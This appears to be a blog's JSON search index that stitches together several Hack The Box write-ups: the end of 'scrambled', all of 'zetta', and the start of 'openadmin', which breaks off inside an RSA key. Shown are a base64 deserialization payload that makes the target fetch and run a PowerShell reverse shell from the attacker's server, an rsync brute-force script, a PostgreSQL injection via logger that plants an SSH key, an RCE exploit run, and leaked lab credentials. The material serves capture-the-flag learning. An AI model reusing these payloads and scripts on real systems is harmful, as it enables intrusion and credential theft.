2MzUnlhVzVuS0Nkb2RIUndPaTh2TVRBdU1UQXVNVFF1Tnk5eVpYWXVjSE14SnlraUlGTjBZVzVrWVhKa1JYSnliM0pGYm1OdlpHbHVaejBpZTNnNlRuVnNiSDBpSUZOMFlXNWtZWEprVDNWMGNIVjBSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJWYzJWeVRtRnRaVDBpSWlCUVlYTnpkMjl5WkQwaWUzZzZUblZzYkgwaUlFUnZiV0ZwYmowaUlpQk1iMkZrVlhObGNsQnliMlpwYkdVOUlrWmhiSE5sSWlCR2FXeGxUbUZ0WlQwaVkyMWtJaUF2UGcwS0lDQWdJQ0FnUEM5elpEcFFjbTlqWlhOekxsTjBZWEowU1c1bWJ6NE5DaUFnSUNBOEwzTmtPbEJ5YjJObGMzTStEUW9nSUR3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrOWlhbVZqZEVsdWMzUmhibU5sUGcwS1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStDdz09Cw==\n➜  scrambled nc scramble.htb 4411\nSCRAMBLECORP_ORDERS_V1.0.3;\nUPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAAuApBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBaWdZOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUhCdmQyVnljMmhsYkd3Z2FXVjRLRzVsZHkxdlltcGxZM1FnYzNsemRHVnRMbTVsZEM1M1pXSmpiR2xsYm5RcExtUnZkMjVzYjJGa2MzUnlhVzVuS0Nkb2RIUndPaTh2TVRBdU1UQXVNVFF1Tnk5eVpYWXVjSE14SnlraUlGTjBZVzVrWVhKa1JYSnliM0pGYm1OdlpHbHVaejBpZTNnNlRuVnNiSDBpSUZOMFlXNWtZWEprVDNWMGNIVjBSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJWYzJWeVRtRnRaVDBpSWlCUVlYTnpkMjl5WkQwaWUzZzZUblZzYkgwaUlFUnZiV0ZwYmowaUlpQk1iMkZrVlhObGNsQnliMlpwYkdVOUlrWmhiSE5sSWlCR2FXeGxUbUZ0WlQwaVkyMWtJaUF2UGcwS0lDQWdJQ0FnUEM5elpEcFFjbTlqWlhOekxsTjBZWEowU1c1bWJ6NE5DaUFnSUNBOEwzTmtPbEJ5YjJObGMzTStEUW9nSUR3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrOWlhbVZqZEVsdWMzUmhibU5sUGcwS1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStDdz09Cw==\n➜  scrambled python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.11.168 - - [16/Sep/2022 10:34:20] \"GET /rev.ps1 HTTP/1.1\" 200 -\n\n\n➜  scrambled nc -lvnp 4488\nlistening on [any] 4488 ...\nconnect to [10.10.14.7] from (UNKNOWN) [10.10.11.168] 65465\n\nPS C:\\Windows\\system32&gt; whoami\nnt authority\\system\n\nPS C:\\Users\\administrator\\Desktop&gt; type root.txt\nc9ff456340b7b2feedb093d15b59f167\nReport root.txt and I’m rank 1 in Sweden!"
  },
  {
    "objectID": "posts/2019-12-02-htb-writeup-zetta/2019-12-02-htb-writeup-zetta.html",
    "href": "posts/2019-12-02-htb-writeup-zetta/2019-12-02-htb-writeup-zetta.html",
    "title": "zetta - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@kali:/opt/htb/machines/bitlab# nmapAutomatorDirb.sh 10.10.10.156 All PORT STATE SERVICE VERSION 21/tcp open ftp Pure-FTPd |_clamav-exec: ERROR: Script execution failed (use -d to debug) |_sslv2-drown: 22/tcp open ssh OpenSSH 7.9p1 Debian 10 (protocol 2.0) |_clamav-exec: ERROR: Script execution failed (use -d to debug) 80/tcp open http nginx |clamav-exec: ERROR: Script execution failed (use -d to debug) | http-csrf: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=zetta.htb | Found the following possible CSRF vulnerabilities: | | Path: http://zetta.htb:80/ | Form id: contactform | Form action: # | | Path: http://zetta.htb:80/index.html | Form id: contactform | Form action: # |_http-dombased-xss: Couldn’t find any DOM based XSS. |_http-stored-xss: Couldn’t find any stored XSS vulnerabilities. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nDIRB\n\nhttp://10.10.10.156:80/index.html (CODE:200|SIZE:39533)\n\nNIKTO\n\nServer: nginx\n\nLooking on the website we find\n\nDual-Stack Support 60%\nFTP RFC2428 Support (v6)\nFTP Creds (free) 6OJCaGVYOJKtY3zFFQUTmtZNl8BHEuq5:6OJCaGVYOJKtY3zFFQUTmtZNl8BHEuq5\n\nReading RFC2428 they inform about the function EPRT, which is used to connect to another host. The following are sample EPRT commands: EPRT |1|132.235.1.2|6275| EPRT |2|1080::8:800:200C:417A|5282|\nWe can use this to send a connection to our attacking devices to disclose the victims (Zetta) IPv6 address. However EPRT isn’t a valid “normal” FTP command, it is a RAW FTP command. Instead of using FTP, we use telnet port 21.\nroot@kali:/opt/htb/machines/zetta# telnet zetta.htb 21 Trying 10.10.10.156… Connected to zetta.htb. Escape character is ‘^]’. 220———- Welcome to Pure-FTPd [privsep] [TLS] ———- 220-You are user number 1 of 500 allowed. 220-Local time is now 09:12. Server port: 21. 220-This is a private system - No anonymous login 220-IPv6 connections are also welcome on this server. 220 You will be disconnected after 15 minutes of inactivity. USER 6OJCaGVYOJKtY3zFFQUTmtZNl8BHEuq5 331 User 6OJCaGVYOJKtY3zFFQUTmtZNl8BHEuq5 OK. Password required PASS 6OJCaGVYOJKtY3zFFQUTmtZNl8BHEuq5 230-This server supports FXP transfers 230-OK. Current restricted directory is / 230-0 files used (0%) - authorized: 10 files 230 0 Kbytes used (0%) - authorized: 1024 Kb eprt |2|dead:beef:2::1008|4488| 200-FXP transfer: from 10.10.14.10 to dead:beef:2::1008%160 200 PORT command successful\nWe must retrieve the IPv6 address somehow so lets setup tcpdump, and then execute a raw ftp command to send data.\nRAW FTP: eprt |2|dead:beef:2::1008|4488| 200-FXP transfer: from 10.10.14.10 to dead:beef:2::1008%160 200 PORT command successful LIST 425 Could not open data connection to port 4488: Connection refused\nroot@kali:~# tcpdump -i tun0 -vv ip6 tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes 09:12:32.613603 IP6 (flowlabel 0x6bdb7, hlim 63, next-header TCP (6) payload length: 40) dead:beef::250:56ff:feb9:df29.37250 &gt; kali.4488: Flags [S], cksum 0x64d3 (correct), seq 1305187145, win 28800, options [mss 1337,sackOK,TS val 374756922 ecr 0,nop,wscale 7], length 0 09:12:32.613626 IP6 (flowlabel 0xbe7b8, hlim 64, next-header TCP (6) payload length: 20) kali.4488 &gt; dead:beef::250:56ff:feb9:df29.37250: Flags [R.], cksum 0xa938 (correct), seq 0, ack 1305187146, win 0, length 0\nIPv6 address of Zetta: dead:beef::250:56ff:feb9:df29\nLets scan the IPv6 address with nmap to see if there are any other ports open.\nroot@kali:/opt/htb/machines/zetta# nmap -6 dead:beef::250:56ff:feb9:df29 -p- Nmap scan report for dead:beef::250:56ff:feb9:df29 Not shown: 65531 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http 8730/tcp open unknown\nA new port, 8730!\nConnect to port 8730 using Telnet. root@kali:/opt/htb/machines/zetta# telnet dead:beef::250:56ff:feb9:df29 8730 Trying dead:beef::250:56ff:feb9:df29… Connected to dead:beef::250:56ff:feb9:df29. Escape character is ‘^]’. @RSYNCD: 31.0 ****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******\nYou must have explicit, authorized permission to access this rsync server. Unauthorized attempts and actions to access or use this system may result in civil and/or criminal penalties.\nAll activities performed on this device are logged and monitored.\n****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******\n@ZE::A staff\nThis rsync server is solely for access to the zetta master server. The modules you see are either provided for “Backup access” or for “Cloud sync”.\nLooks like it’s used for rsync. In order to pull info from the server we need SSH-creds. Rsync pull syntax: rsync -6 zetta-user@[dead:beef::250:56ff:feb9:df29]:/home/zetta-user/ /opt/htb/machines/zetta/\nWe can list all rsync modules by writing rsync -6r rsync://[dead:beef::250:56ff:feb9:df29]:8730/ . bin Backup access to /bin boot Backup access to /boot lib Backup access to /lib lib64 Backup access to /lib64 opt Backup access to /opt sbin Backup access to /sbin srv Backup access to /srv usr Backup access to /usr var Backup access to /var\nThe output is sparse, and we don’t have access to backup any of the directories. Reading on the forums they say: “If you’ve got the list of modules, there’s some hidden ones. Think about what folders are interesting on most linux systems.”\nBecause of this I tried to pull directories of intrest from the server to my local box, and behold /etc was available root@kali:/opt/htb/machines/zetta# rsync -6r rsync://[dead:beef::250:56ff:feb9:df29]:8730/etc etc/\nWithin the folders we don’t find anything giving us direct access, like id_rsa, passwords etc. However we do find all valid users that are able to ssh, as well as another hidden rsync module (home_roy) root@kali:/opt/htb/machines/zetta/etc# cat passwd root:x:0:0:root:/root:/bin/bash roy:x:1000:1000:roy,,,:/home/roy:/bin/bash postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\nroot@kali:/opt/htb/machines/zetta/etc# cat rsyncd.conf .. [home_roy] path = /home/roy read only = no # Authenticate user for security reasons. uid = roy gid = roy auth users = roy secrets file = /etc/rsyncd.secrets # Hide home module so that no one tries to access it. list = false\nRest of the rsync modules are only available from host 104.24.0.54\nLets create a simple brute force script to grab passwords from rockyou.txt and auto-backup module home_roy as user roy. We can call the environmental variable RSYNC_PASSWORD so we don’t get prompted to enter a password.\nroot@kali:/opt/htb/machines/zetta# cat rsyncBrute-v6.sh #!/bin/bash ## INPUT VARIABLES ## NOTE: Module input MUST start with / USER=“roy” PASSFILE=“/usr/share/wordlists/rockyou.txt” IPV6=“dead:beef::250:56ff:feb9:a83e” PORT=“8730” MODULE=“/home_roy” DEST=“/opt/htb/machines/zetta/home_roy/”\nfor i in $(cat \\(PASSFILE); do\n     printf \"\\n##########################################\\n\"\n     printf \"\\tTESTING PASSWORD: \"\\)i printf “##########################################” env RSYNC_PASSWORD=\\(i rsync -r6v rsync://\\)USER@[\\(IPV6]:\\)PORT$MODULE $DEST done\nThe script don’t have any escape function so we must look at the output and be fast to cancel it when we are successful. root@kali:/opt/htb/machines/zetta# ./rsyncBrute-v6.sh .. .. ########################################## TESTING PASSWORD: computer ########################################## ****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******\nYou must have explicit, authorized permission to access this rsync server. Unauthorized attempts and actions to access or use this system may result in civil and/or criminal penalties.\nAll activities performed on this device are logged and monitored.\n****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******\n@ZE::A staff\nThis rsync server is solely for access to the zetta master server. The modules you see are either provided for “Backup access” or for “Cloud sync”.\nreceiving incremental file list skipping non-regular file “.bash_history” .bash_logout .bashrc .profile .tudu.xml user.txt\nsent 119 bytes received 9,743 bytes 6,574.67 bytes/sec total size is 9,347 speedup is 0.95\nRsync credentials found (roy:computer) and we we’re able to backup /home/roy containing user.txt root@kali:/opt/htb/machines/zetta/home_roy# cat user.txt a575****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nThe rsync module home_roy has option “read only = no”, hinting that we should upload a file to get a shell. Upload ssh pub key to authorized_keys. Start by creating the keys and file to upload.\nroot@kali:/opt/htb/machines/zetta# ssh-keygen -t rsa -b 4096 Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): /opt/htb/machines/zetta/id_rsa-zetta Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /opt/htb/machines/zetta/id_rsa-zetta. Your public key has been saved in /opt/htb/machines/zetta/id_rsa-zetta.pub. The key fingerprint is: SHA256:ryvpTwZfeLDElP6ngcYOA6vY+oICK/sTdIgUiHJCFD0 root@kali The key’s randomart image is: +—[RSA 4096]—-+ |==+ .. | |=..E o. | |o+ .. .+ | |. o o ..+ | | . . o..Soo | |. . . oo++o . | |o+ o + .+ | |B + oo… | |=o. ..o+. | +—-[SHA256]—–+\nroot@kali:/opt/htb/machines/zetta# cat id_rsa-zetta.pub &gt; authorized_keys root@kali:/opt/htb/machines/zetta# cat authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDDtv8vHi0OZO4zbtdn5pf2j7pnxd6cbA/Bxvxh0ZuwWaLu7WjzNHltDhydA/XoI3UCPQ8ZqyaieLV2eBOD+O0E+X2tyKx2RyKcMFNkKNSAq5F9AWULbl7pjbpbiQDSy3hvvFGBgND/vwGsXpnLFd+8v03cpa/9LramyvU/Exg6XlvN+10Z2nCrsA19UvPLY3C94iqINKt/nJ6JaAVDeTii9tMBCjI4M4jzt6U8zdeOlXdUVVUKdsNO9ggpwRGQxv262az/9hKaNNwKCDtbyiQoYBdhNBmguHQdk3Ob4gVT5Fh2QJgj0qMCtwb/LXgBtZkautO8VZMuc25cxuTMynR8GwCHBzj7hZ8dnkKnibWZSruUA4sMP2Zy+ge45lgL+kzDuRNT58nN1XsRxEzBc+JFChuKi7JngOOQ2AnwUt5K02R7Na8n18YzkaiE9aVodNZkvs59cwcf0svDXaWV0wY183h/k1Q0U5a2pdG5HhVDXsdE4uXXTtHcepYoZwkvsMlh1XtiPOp4aIDnxeLvZ2+tN/V48lfYAUnVPiA0bnN3xjcjprf7J0enCmyeCgghZJzoXMsIuicydYIW22g8wmOF8rB+iDAhCYBvlmrRYdP84SO0MfPLr50SNBN8gOUk0B1B6d68A/O17xs8DaTq3T50uiL2/K8CWKCHpAi/25gEgw== root@kali\nUpload authorized_keys to /home/roy/.ssh/ and login. root@kali:/opt/htb/machines/zetta# rsync -r6v /opt/htb/machines/zetta/authorized_keys rsync://roy@[dead:beef::250:56ff:feb9:a83e]:8730/home_roy/.ssh/ Password: computer\nroot@kali:/opt/htb/machines/zetta# ssh roy@zetta.htb -i id_rsa-zetta Enter passphrase for key ‘id_rsa-zetta’: Linux zetta 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64 Last login: Sat Aug 31 15:43:18 2019 from 10.10.14.2 roy@zetta:~$\nEnumerating roys home dir we find tudu.xml, the last line is especially interesting however we don’t have any creds that match yet. “Change shared password scheme from @userid to something more secure.”\nCopy + Paste lse.sh over to the victim and run it. We find that there are three .git dirs, and psql is running locally. [*] fst150 Looking for GIT/SVN repositories………………………….. yes! /etc/pure-ftpd/.git /etc/nginx/.git /etc/rsyslog.d/.git\n[*] net000 Services listening only on localhost………………………. yes! tcp LISTEN 0 128 127.0.0.1:5432 0.0.0.0:*\nLooking through the dirs we find nothing interesting, however we are able to execute git-commands. Using git log and git show gives us interesting information. At first glance we get creds postgres:test1234 however these don’t work. But now at least we know that the logs are store in psql db syslog.\nroy@zetta:/etc/rsyslog.d/.git$ git show commit e25cc20218f99abd68a2bf06ebfa81cd7367eb6a (HEAD -&gt; master) Author: root root@zetta.htb Date: Sat Jul 27 05:51:43 2019 -0400\n   Adding/adapting template from manual.\ndiff –git a/pgsql.conf b/pgsql.conf index f31836d..9649f68 100644 — a/pgsql.conf +++ b/pgsql.conf @@ -1,5 +1,22 @@ ### Configuration file for rsyslog-pgsql ### Changes are preserved\n-module (load=“ompgsql”) -. action(type=“ompgsql” server=“localhost” db=“Syslog” uid=“rsyslog” pwd=““) +# https://www.rsyslog.com/doc/v8-stable/configuration/modules/ompgsql.html +# +# Used default template from documentation/source but adapted table +# name to syslog_lines so the Ruby on Rails application Maurice is +# coding can use this as SyslogLine object. +# +template(name=”sql-syslog” type=“list” option.sql=“on”) {\n\nconstant(value=“INSERT INTO syslog_lines (message, devicereportedtime) values (’”)\nproperty(name=“msg”)\nconstant(value=“‘,’”)\nproperty(name=“timereported” dateformat=“pgsql” date.inUTC=“on”)\nconstant(value=“’)”) +}\n+# load module +module(load=“ompgsql”)\n+# Only forward local7.info for testing. +local7.info action(type=“ompgsql” server=“localhost” user=“postgres” pass=“test1234” db=“syslog” template=“sql-syslog”)\n\nFrom the last two lines of the output below, we know that local7.info logs are sent into the db syslog. We can exploit this using ‘logger -p local7.info’ to send data into the database. With the command pg_exec we can execute postgres commands as well. Verify your injections for errors by following the log in /var/log/postgresql using tail -fF\nroy@zetta:/tmp$ logger -p local7.info “’, now()); DROP TABLE IF EXISTS cmd_exec; – #” roy@zetta:/tmp$ logger -p local7.info “’, now()); CREATE TABLE cmd_exec(cmd_output text); – #” roy@zetta:/tmp$ logger -p local7.info “’, now()); COPY cmd_exec FROM PROGRAM $$echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDDtv8vHi0OZO4zbtdn5pf2j7pnxd6cbA/Bxvxh0ZuwWaLu7WjzNHltDhydA/XoI3UCPQ8ZqyaieLV2eBOD+O0E+X2tyKx2RyKcMFNkKNSAq5F9AWULbl7pjbpbiQDSy3hvvFGBgND/vwGsXpnLFd+8v03cpa/9LramyvU/Exg6XlvN+10Z2nCrsA19UvPLY3C94iqINKt/nJ6JaAVDeTii9tMBCjI4M4jzt6U8zdeOlXdUVVUKdsNO9ggpwRGQxv262az/9hKaNNwKCDtbyiQoYBdhNBmguHQdk3Ob4gVT5Fh2QJgj0qMCtwb/LXgBtZkautO8VZMuc25cxuTMynR8GwCHBzj7hZ8dnkKnibWZSruUA4sMP2Zy+ge45lgL+kzDuRNT58nN1XsRxEzBc+JFChuKi7JngOOQ2AnwUt5K02R7Na8n18YzkaiE9aVodNZkvs59cwcf0svDXaWV0wY183h/k1Q0U5a2pdG5HhVDXsdE4uXXTtHcepYoZwkvsMlh1XtiPOp4aIDnxeLvZ2+tN/V48lfYAUnVPiA0bnN3xjcjprf7J0enCmyeCgghZJzoXMsIuicydYIW22g8wmOF8rB+iDAhCYBvlmrRYdP84SO0MfPLr50SNBN8gOUk0B1B6d68A/O17xs8DaTq3T50uiL2/K8CWKCHpAi/25gEgw== root@kali &gt;&gt; /var/lib/postgresql/.ssh/authorized_keys$$; – #”\nroot@kali:/opt/htb/machines/zetta# ssh postgres@zetta.htb -i id_rsa-zetta Enter passphrase for key ‘id_rsa-zetta’: Linux zetta 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64 Last login: Wed Dec 4 12:58:47 2019 from 10.10.14.9 postgres@zetta:~$ id uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)\nEnumerating the home dir of postgres we find .psql_history containing creds. postgres@zetta:~$ cat .psql_history .. yslog_lines ALTER USER postgres WITH PASSWORD ‘sup3rs3cur3p4ass@postgres’;\nRemembering the last line in tudu.xml found in /home/roy we can try if the password scheme is applicable for root (sup3rs3cur3p4ass@root)\npostgres@zetta:~$ su Password: root@zetta:/var/lib/postgresql# id uid=0(root) gid=0(root) groups=0(root) root@zetta:~# cat root.txt b940****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nRFC2428 https://www.rfc-editor.org/rfc/rfc2428.html\nRAW FTP https://stackoverflow.com/questions/46577846/how-to-use-raw-ftp-stor-command https://en.wikipedia.org/wiki/List_of_FTP_commands\nRsync https://www.atlantic.net/vps-hosting/how-to-use-rsync-copy-sync-files-servers/\nScript https://likegeeks.com/bash-scripting-step-step-part2/ https://stackoverflow.com/questions/13510229/giving-the-password-of-the-server-within-the-command https://serverfault.com/questions/127209/username-and-password-for-rsync-in-script\nGit-commands https://www.edureka.co/blog/git-commands-with-example/\nLocal7 / Logger https://unix.stackexchange.com/questions/535675/rsyslog-filter-severity-not-working\nPostgres SQL Injection http://pgtclng.sourceforge.net/pgtcldocs/pg-exec.html https://www.dionach.com/blog/postgresql-9x-remote-command-execution http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5 ``````"
  },
  {
    "objectID": "posts/2020-01-07-htb-writeup-openadmin/2020-01-07-htb-writeup-openadmin.html",
    "href": "posts/2020-01-07-htb-writeup-openadmin/2020-01-07-htb-writeup-openadmin.html",
    "title": "Openadmin - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@p3:/opt/htb/machines/resolute# nmapAutomatorDirb.sh 10.10.10.171 All PORT STATE SERVICE 22/tcp open ssh 80/tcp open http\n\nhttp://openadmin.htb/index.html (CODE:200|SIZE:10918)\nhttp://openadmin.htb/server-status (CODE:403|SIZE:278)\nhttp://openadmin.htb/artwork/index.html (CODE:200|SIZE:14461)\nhttp://openadmin.htb/music/index.html (CODE:200|SIZE:12554)\n\nLooking through the websites we find that “Admin” has made a lot of posts on /artwork/blog.html, this might be a possible user. Also a testemonial from Craig Stephen, also possible user?\nOn /music/index.html, pressing the Login button gives us what looks like admin privs for OpenNetAdmin http://openadmin.htb/ona/ The application is running on version 18.1.1, which is NOT the latest release. A quick google shows us that this version has a RCE vulnerability.\nRunning the RCE script gives us a “shell” as user www-data with limited privs. We are unable to traverse, but can execute commands root@p3:/opt/htb/machines/openadmin# ./ona-expl.sh http://openadmin.htb/ona/ $ whoami www-data\nEnumerating through the folders of /opt/ona/www we find a config file for the database connection, and within credentials. $ cat local/config/database_settings.inc.php  array ( ‘databases’ =&gt; array ( 0 =&gt; array ( ‘db_type’ =&gt; ‘mysqli’, ‘db_host’ =&gt; ‘localhost’, ‘db_login’ =&gt; ‘ona_sys’, ‘db_passwd’ =&gt; ‘n1nj4W4rri0R!’, ‘db_database’ =&gt; ‘ona_default’, ‘db_debug’ =&gt; false, ), ), ‘description’ =&gt; ‘Default data context’, ‘context_color’ =&gt; ‘#D3DBFF’, ), );\n$ ls -al /home/ total 16 drwxr-xr-x 4 root root 4096 Nov 22 18:00 . drwxr-xr-x 24 root root 4096 Nov 21 13:41 .. drwxr-x— 6 jimmy jimmy 4096 Jan 7 06:29 jimmy drwxr-x— 6 joanna joanna 4096 Nov 28 09:37 joanna\n\nWe got 2 users (jimmy & joanna) and 1 password (n1nj4W4rri0R!)\n\nWe are able to SSH with the credentials jimmy:n1nj4W4rri0R! Enumerating through the box we find /var/www/internal and within index.php, main.php and logout.php.\nmain.php has some interesting code - if user = jimmy and password = some-hash, then we are able to access main.php\n&lt;?php $msg = ’’;\nif (isset(\\(_POST['login']) && !empty(\\)_POST[‘username’]) && !empty(\\(_POST['password'])) {\n   if (\\)_POST[‘username’] == ‘jimmy’ && hash(‘sha512’,$_POST[‘password’]) == ‘00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1’) { $_SESSION[‘username’] = ‘jimmy’; header(“Location: /main.php”); } else { $msg = ‘Wrong username or password.’; } }\nFirst we need to find the port this local webserver is running on, we use ss for this. jimmy@openadmin:/var/www/internal$ ss -tulpn Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0: tcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0: tcp LISTEN 0 128 127.0.0.1:52846 0.0.0.0: tcp LISTEN 0 128 127.0.0.53%lo:53 0.0.0.0: tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0: tcp LISTEN 0 128 :80 : tcp LISTEN 0 128 [::]:22 [::]:*\nWe know all of the ports except 52846, this is most likely the local webserver. Try to curl it and see if it looks right. jimmy@openadmin:/var/www/internal$ curl localhost:52846 ..\n\nEnter Username and Password\n\n\n &lt;h2 class=\"featurette-heading\"&gt;Login Restricted.&lt;span class=\"text-muted\"&gt;&lt;/span&gt;&lt;/h2&gt;\n     &lt;/div&gt; &lt;!-- /container --&gt;\n..\nThis output seems to match the data in /var/www/internal/index.php. So lets try to curl main.php using jimmys credentials. jimmy@openadmin:/var/www/internal$ curl localhost:52846/main.php -u jimmy:n1nj4W4rri0R!\n-----BEGIN RSA PRIVATE KEY-----\n   Proc-Type: 4,ENCRYPTED\n   DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D\n\n   kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8\n   ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO\n   ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE\n   6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ\n   ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du\n   